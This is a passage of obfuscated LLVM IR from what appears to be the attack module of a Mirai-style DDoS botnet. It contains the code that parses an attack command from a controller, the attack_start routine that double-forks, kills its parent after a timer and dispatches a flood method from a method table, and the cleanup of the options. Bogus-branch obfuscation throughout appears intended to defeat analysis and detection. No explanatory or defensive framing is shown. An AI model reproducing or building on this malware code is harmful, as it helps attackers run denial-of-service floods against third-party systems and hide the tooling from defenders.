  %280 = call noalias i8* @calloc(i64 %279, i64 16) #6
  %281 = bitcast i8* %280 to %struct.attack_option*
  store %struct.attack_option* %281, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %282

; <label>:282:                                    ; preds = %415, %277
  %283 = load i32, i32* @x.7
  %284 = load i32, i32* @y.8
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %282
  %291 = load i32, i32* %13, align 4
  %292 = load i8, i8* %17, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  %295 = load i32, i32* @x.7
  %296 = load i32, i32* @y.8
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %294, label %303, label %418

; <label>:303:                                    ; preds = %originalBBpart295
  %304 = load i32, i32* %12, align 4
  %305 = sext i32 %304 to i64
  %306 = icmp ult i64 %305, 1
  br i1 %306, label %307, label %308

; <label>:307:                                    ; preds = %303
  br label %427

; <label>:308:                                    ; preds = %303
  %309 = load i32, i32* @x.7
  %310 = load i32, i32* @y.8
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %308
  %317 = load i8*, i8** %11, align 8
  %318 = getelementptr inbounds i8, i8* %317, i32 1
  store i8* %318, i8** %11, align 8
  %319 = load i8, i8* %317, align 1
  %320 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %321 = load i32, i32* %13, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %323, i32 0, i32 1
  store i8 %319, i8* %324, align 8
  %325 = load i32, i32* %12, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 %326, 1
  %328 = trunc i64 %327 to i32
  store i32 %328, i32* %12, align 4
  %329 = load i32, i32* %12, align 4
  %330 = sext i32 %329 to i64
  %331 = icmp ult i64 %330, 1
  %332 = load i32, i32* @x.7
  %333 = load i32, i32* @y.8
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart2105, label %originalBB97alteredBB

originalBBpart2105:                               ; preds = %originalBB97
  br i1 %331, label %340, label %357

; <label>:340:                                    ; preds = %originalBBpart2105
  %341 = load i32, i32* @x.7
  %342 = load i32, i32* @y.8
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %340
  %349 = load i32, i32* @x.7
  %350 = load i32, i32* @y.8
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %427

; <label>:357:                                    ; preds = %originalBBpart2105
  %358 = load i32, i32* @x.7
  %359 = load i32, i32* @y.8
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %357
  %366 = load i8*, i8** %11, align 8
  %367 = getelementptr inbounds i8, i8* %366, i32 1
  store i8* %367, i8** %11, align 8
  %368 = load i8, i8* %366, align 1
  store i8 %368, i8* %20, align 1
  %369 = load i32, i32* %12, align 4
  %370 = sext i32 %369 to i64
  %371 = sub i64 %370, 1
  %372 = trunc i64 %371 to i32
  store i32 %372, i32* %12, align 4
  %373 = load i32, i32* %12, align 4
  %374 = load i8, i8* %20, align 1
  %375 = zext i8 %374 to i32
  %376 = icmp slt i32 %373, %375
  %377 = load i32, i32* @x.7
  %378 = load i32, i32* @y.8
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart2126, label %originalBB111alteredBB

originalBBpart2126:                               ; preds = %originalBB111
  br i1 %376, label %385, label %386

; <label>:385:                                    ; preds = %originalBBpart2126
  br label %427

; <label>:386:                                    ; preds = %originalBBpart2126
  %387 = load i8, i8* %20, align 1
  %388 = zext i8 %387 to i32
  %389 = add nsw i32 %388, 1
  %390 = sext i32 %389 to i64
  %391 = call noalias i8* @calloc(i64 %390, i64 1) #6
  %392 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %393 = load i32, i32* %13, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %395, i32 0, i32 0
  store i8* %391, i8** %396, align 8
  %397 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %398 = load i32, i32* %13, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %400, i32 0, i32 0
  %402 = load i8*, i8** %401, align 8
  %403 = load i8*, i8** %11, align 8
  %404 = load i8, i8* %20, align 1
  %405 = zext i8 %404 to i32
  call void @util_memcpy(i8* %402, i8* %403, i32 %405)
  %406 = load i8, i8* %20, align 1
  %407 = zext i8 %406 to i32
  %408 = load i8*, i8** %11, align 8
  %409 = sext i32 %407 to i64
  %410 = getelementptr inbounds i8, i8* %408, i64 %409
  store i8* %410, i8** %11, align 8
  %411 = load i8, i8* %20, align 1
  %412 = zext i8 %411 to i32
  %413 = load i32, i32* %12, align 4
  %414 = sub nsw i32 %413, %412
  store i32 %414, i32* %12, align 4
  br label %415

; <label>:415:                                    ; preds = %386
  %416 = load i32, i32* %13, align 4
  %417 = add nsw i32 %416, 1
  store i32 %417, i32* %13, align 4
  br label %282

; <label>:418:                                    ; preds = %originalBBpart295
  br label %419

; <label>:419:                                    ; preds = %418, %originalBBpart291
  %420 = call i32* @__errno_location() #7
  store i32 0, i32* %420, align 4
  %421 = load i32, i32* %14, align 4
  %422 = load i8, i8* %15, align 1
  %423 = load i8, i8* %16, align 1
  %424 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %425 = load i8, i8* %17, align 1
  %426 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %421, i8 zeroext %422, i8 zeroext %423, %struct.attack_target* %424, i8 zeroext %425, %struct.attack_option* %426)
  br label %427

; <label>:427:                                    ; preds = %419, %385, %originalBBpart2109, %307, %originalBBpart274, %141, %117, %105, %78, %originalBBpart24
  %428 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %429 = icmp ne %struct.attack_target* %428, null
  br i1 %429, label %430, label %433

; <label>:430:                                    ; preds = %427
  %431 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %432 = bitcast %struct.attack_target* %431 to i8*
  call void @free(i8* %432) #6
  br label %433

; <label>:433:                                    ; preds = %430, %427
  %434 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %435 = icmp ne %struct.attack_option* %434, null
  br i1 %435, label %436, label %440

; <label>:436:                                    ; preds = %433
  %437 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %438 = load i8, i8* %17, align 1
  %439 = zext i8 %438 to i32
  call void @free_opts(%struct.attack_option* %437, i32 %439)
  br label %440

; <label>:440:                                    ; preds = %436, %433
  %441 = load i32, i32* @x.7
  %442 = load i32, i32* @y.8
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %440
  %449 = load i32, i32* @x.7
  %450 = load i32, i32* @y.8
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %457 = alloca i8*, align 8
  %458 = alloca i32, align 4
  %459 = alloca i32, align 4
  %460 = alloca i32, align 4
  %461 = alloca i8, align 1
  %462 = alloca i8, align 1
  %463 = alloca i8, align 1
  %464 = alloca %struct.attack_target*, align 8
  %465 = alloca %struct.attack_option*, align 8
  %466 = alloca i8, align 1
  store i8* %0, i8** %457, align 8
  store i32 %1, i32* %458, align 4
  store %struct.attack_target* null, %struct.attack_target** %464, align 8
  store %struct.attack_option* null, %struct.attack_option** %465, align 8
  %467 = load i32, i32* %458, align 4
  %468 = sext i32 %467 to i64
  %469 = icmp ult i64 %468, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %470 = load i8*, i8** %11, align 8
  %471 = bitcast i8* %470 to i32*
  %472 = load i32, i32* %471, align 4
  %473 = call i32 @ntohl(i32 %472) #7
  store i32 %473, i32* %14, align 4
  %474 = load i8*, i8** %11, align 8
  %475 = getelementptr inbounds i8, i8* %474, i64 4
  store i8* %475, i8** %11, align 8
  %476 = load i32, i32* %12, align 4
  %477 = sext i32 %476 to i64
  %_ = sub i64 0, %477
  %gen = add i64 %_, 4
  %_7 = sub i64 %477, 4
  %gen8 = mul i64 %_7, 4
  %_9 = sub i64 %477, 4
  %gen10 = mul i64 %_9, 4
  %_11 = sub i64 %477, 4
  %gen12 = mul i64 %_11, 4
  %_13 = sub i64 0, %477
  %gen14 = add i64 %_13, 4
  %_15 = shl i64 %477, 4
  %_16 = sub i64 0, %477
  %gen17 = add i64 %_16, 4
  %478 = sub i64 %477, 4
  %479 = trunc i64 %478 to i32
  store i32 %479, i32* %12, align 4
  %480 = load i32, i32* %12, align 4
  %481 = icmp eq i32 %480, 0
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %79
  %482 = load i8*, i8** %11, align 8
  %483 = getelementptr inbounds i8, i8* %482, i32 1
  store i8* %483, i8** %11, align 8
  %484 = load i8, i8* %482, align 1
  store i8 %484, i8* %15, align 1
  %485 = load i32, i32* %12, align 4
  %486 = sext i32 %485 to i64
  %_22 = sub i64 0, %486
  %gen23 = add i64 %_22, 1
  %_24 = shl i64 %486, 1
  %_25 = sub i64 %486, 1
  %gen26 = mul i64 %_25, 1
  %_27 = sub i64 %486, 1
  %gen28 = mul i64 %_27, 1
  %_29 = sub i64 %486, 1
  %gen30 = mul i64 %_29, 1
  %_31 = sub i64 %486, 1
  %gen32 = mul i64 %_31, 1
  %_33 = shl i64 %486, 1
  %_34 = sub i64 0, %486
  %gen35 = add i64 %_34, 1
  %487 = sub i64 %486, 1
  %488 = trunc i64 %487 to i32
  store i32 %488, i32* %12, align 4
  %489 = load i32, i32* %12, align 4
  %490 = icmp eq i32 %489, 0
  br label %originalBB21

originalBB39alteredBB:                            ; preds = %originalBB39, %118
  %491 = load i32, i32* %12, align 4
  %492 = sext i32 %491 to i64
  %493 = load i8, i8* %16, align 1
  %494 = zext i8 %493 to i64
  %_40 = shl i64 5, %494
  %_41 = shl i64 5, %494
  %_42 = sub i64 5, %494
  %gen43 = mul i64 %_42, %494
  %_44 = sub i64 5, %494
  %gen45 = mul i64 %_44, %494
  %_46 = shl i64 5, %494
  %_47 = sub i64 5, %494
  %gen48 = mul i64 %_47, %494
  %_49 = sub i64 0, 5
  %gen50 = add i64 %_49, %494
  %_51 = shl i64 5, %494
  %495 = mul i64 5, %494
  %496 = icmp ult i64 %492, %495
  br label %originalBB39

originalBB55alteredBB:                            ; preds = %originalBB55, %142
  %497 = load i8, i8* %16, align 1
  %498 = zext i8 %497 to i64
  %499 = call noalias i8* @calloc(i64 %498, i64 24) #6
  %500 = bitcast i8* %499 to %struct.attack_target*
  store %struct.attack_target* %500, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %210
  %501 = load i32, i32* %13, align 4
  %_60 = sub i32 0, %501
  %gen61 = add i32 %_60, 1
  %_62 = sub i32 0, %501
  %gen63 = add i32 %_62, 1
  %_64 = shl i32 %501, 1
  %_65 = sub i32 0, %501
  %gen66 = add i32 %_65, 1
  %_67 = sub i32 %501, 1
  %gen68 = mul i32 %_67, 1
  %502 = add nsw i32 %501, 1
  store i32 %502, i32* %13, align 4
  br label %originalBB59

originalBB72alteredBB:                            ; preds = %originalBB72, %233
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %250
  %503 = load i8*, i8** %11, align 8
  %504 = getelementptr inbounds i8, i8* %503, i32 1
  store i8* %504, i8** %11, align 8
  %505 = load i8, i8* %503, align 1
  store i8 %505, i8* %17, align 1
  %506 = load i32, i32* %12, align 4
  %507 = sext i32 %506 to i64
  %_77 = sub i64 0, %507
  %gen78 = add i64 %_77, 1
  %_79 = shl i64 %507, 1
  %_80 = sub i64 %507, 1
  %gen81 = mul i64 %_80, 1
  %_82 = sub i64 %507, 1
  %gen83 = mul i64 %_82, 1
  %_84 = sub i64 0, %507
  %gen85 = add i64 %_84, 1
  %_86 = sub i64 %507, 1
  %gen87 = mul i64 %_86, 1
  %_88 = shl i64 %507, 1
  %_89 = shl i64 %507, 1
  %508 = sub i64 %507, 1
  %509 = trunc i64 %508 to i32
  store i32 %509, i32* %12, align 4
  %510 = load i8, i8* %17, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp sgt i32 %511, 0
  br label %originalBB76

originalBB93alteredBB:                            ; preds = %originalBB93, %282
  %513 = load i32, i32* %13, align 4
  %514 = load i8, i8* %17, align 1
  %515 = zext i8 %514 to i32
  %516 = icmp slt i32 %513, %515
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %308
  %517 = load i8*, i8** %11, align 8
  %518 = getelementptr inbounds i8, i8* %517, i32 1
  store i8* %518, i8** %11, align 8
  %519 = load i8, i8* %517, align 1
  %520 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %521 = load i32, i32* %13, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %523, i32 0, i32 1
  store i8 %519, i8* %524, align 8
  %525 = load i32, i32* %12, align 4
  %526 = sext i32 %525 to i64
  %_98 = sub i64 0, %526
  %gen99 = add i64 %_98, 1
  %_100 = shl i64 %526, 1
  %_101 = shl i64 %526, 1
  %_102 = sub i64 0, %526
  %gen103 = add i64 %_102, 1
  %527 = sub i64 %526, 1
  %528 = trunc i64 %527 to i32
  store i32 %528, i32* %12, align 4
  %529 = load i32, i32* %12, align 4
  %530 = sext i32 %529 to i64
  %531 = icmp ult i64 %530, 1
  br label %originalBB97

originalBB107alteredBB:                           ; preds = %originalBB107, %340
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %357
  %532 = load i8*, i8** %11, align 8
  %533 = getelementptr inbounds i8, i8* %532, i32 1
  store i8* %533, i8** %11, align 8
  %534 = load i8, i8* %532, align 1
  store i8 %534, i8* %20, align 1
  %535 = load i32, i32* %12, align 4
  %536 = sext i32 %535 to i64
  %_112 = sub i64 0, %536
  %gen113 = add i64 %_112, 1
  %_114 = sub i64 %536, 1
  %gen115 = mul i64 %_114, 1
  %_116 = sub i64 0, %536
  %gen117 = add i64 %_116, 1
  %_118 = sub i64 0, %536
  %gen119 = add i64 %_118, 1
  %_120 = sub i64 %536, 1
  %gen121 = mul i64 %_120, 1
  %_122 = shl i64 %536, 1
  %_123 = sub i64 %536, 1
  %gen124 = mul i64 %_123, 1
  %537 = sub i64 %536, 1
  %538 = trunc i64 %537 to i32
  store i32 %538, i32* %12, align 4
  %539 = load i32, i32* %12, align 4
  %540 = load i8, i8* %20, align 1
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %539, %541
  br label %originalBB111

originalBB128alteredBB:                           ; preds = %originalBB128, %440
  br label %originalBB128
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.9
  %8 = load i32, i32* @y.10
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %24 = call i32 @fork() #6
  store i32 %24, i32* %21, align 4
  %25 = load i32, i32* %21, align 4
  %26 = icmp eq i32 %25, -1
  %27 = load i32, i32* @x.9
  %28 = load i32, i32* @y.10
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %21, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %originalBBpart2
  ret void

; <label>:39:                                     ; preds = %35
  %40 = call i32 @fork() #6
  store i32 %40, i32* %22, align 4
  %41 = load i32, i32* %22, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %39
  call void @exit(i32 0) #8
  unreachable

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.9
  %46 = load i32, i32* @y.10
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load i32, i32* %22, align 4
  %54 = icmp eq i32 %53, 0
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %68

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* %15, align 4
  %65 = call i32 @sleep(i32 %64)
  %66 = call i32 @getppid() #6
  %67 = call i32 @kill(i32 %66, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:68:                                     ; preds = %originalBBpart24
  store i32 0, i32* %23, align 4
  br label %69

; <label>:69:                                     ; preds = %99, %68
  %70 = load i32, i32* %23, align 4
  %71 = load i8, i8* @methods_len, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %70, %72
  br i1 %73, label %74, label %102

; <label>:74:                                     ; preds = %69
  %75 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %76 = load i32, i32* %23, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %75, i64 %77
  %79 = load %struct.attack_method*, %struct.attack_method** %78, align 8
  %80 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %79, i32 0, i32 1
  %81 = load i8, i8* %80, align 8
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* %16, align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %82, %84
  br i1 %85, label %86, label %98

; <label>:86:                                     ; preds = %74
  %87 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %88 = load i32, i32* %23, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %87, i64 %89
  %91 = load %struct.attack_method*, %struct.attack_method** %90, align 8
  %92 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %91, i32 0, i32 0
  %93 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %92, align 8
  %94 = load i8, i8* %17, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %96 = load i8, i8* %19, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %93(i8 zeroext %94, %struct.attack_target* %95, i8 zeroext %96, %struct.attack_option* %97)
  br label %102

; <label>:98:                                     ; preds = %74
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %23, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %23, align 4
  br label %69

; <label>:102:                                    ; preds = %86, %69
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %103 = alloca i32, align 4
  %104 = alloca i8, align 1
  %105 = alloca i8, align 1
  %106 = alloca %struct.attack_target*, align 8
  %107 = alloca i8, align 1
  %108 = alloca %struct.attack_option*, align 8
  %109 = alloca i32, align 4
  %110 = alloca i32, align 4
  %111 = alloca i32, align 4
  store i32 %0, i32* %103, align 4
  store i8 %1, i8* %104, align 1
  store i8 %2, i8* %105, align 1
  store %struct.attack_target* %3, %struct.attack_target** %106, align 8
  store i8 %4, i8* %107, align 1
  store %struct.attack_option* %5, %struct.attack_option** %108, align 8
  %112 = call i32 @fork() #6
  store i32 %112, i32* %109, align 4
  %113 = load i32, i32* %109, align 4
  %114 = icmp eq i32 %113, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %115 = load i32, i32* %22, align 4
  %116 = icmp eq i32 %115, 0
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = load i32, i32* @x.11
  %4 = load i32, i32* @y.12
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %11, align 8
  store i32 %1, i32* %12, align 4
  %14 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %15 = icmp eq %struct.attack_option* %14, null
  %16 = load i32, i32* @x.11
  %17 = load i32, i32* @y.12
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %41

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.11
  %26 = load i32, i32* @y.12
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %100

; <label>:41:                                     ; preds = %originalBBpart2
  store i32 0, i32* %13, align 4
  br label %42

; <label>:42:                                     ; preds = %94, %41
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %12, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %97

; <label>:46:                                     ; preds = %42
  %47 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %48 = load i32, i32* %13, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i64 %49
  %51 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = icmp ne i8* %52, null
  br i1 %53, label %54, label %77

; <label>:54:                                     ; preds = %46
  %55 = load i32, i32* @x.11
  %56 = load i32, i32* @y.12
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %64 = load i32, i32* %13, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %63, i64 %65
  %67 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %66, i32 0, i32 0
  %68 = load i8*, i8** %67, align 8
  call void @free(i8* %68) #6
  %69 = load i32, i32* @x.11
  %70 = load i32, i32* @y.12
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %77

; <label>:77:                                     ; preds = %originalBBpart28, %46
  %78 = load i32, i32* @x.11
  %79 = load i32, i32* @y.12
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %77
  %86 = load i32, i32* @x.11
  %87 = load i32, i32* @y.12
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %94

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* %13, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %13, align 4
  br label %42

; <label>:97:                                     ; preds = %42
  %98 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %99 = bitcast %struct.attack_option* %98 to i8*
  call void @free(i8* %99) #6
  br label %100

; <label>:100:                                    ; preds = %97, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %101 = alloca %struct.attack_option*, align 8
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %101, align 8
  store i32 %1, i32* %102, align 4
  %104 = load %struct.attack_option*, %struct.attack_option** %101, align 8
  %105 = icmp eq %struct.attack_option* %104, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %106 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %107 = load i32, i32* %13, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %106, i64 %108
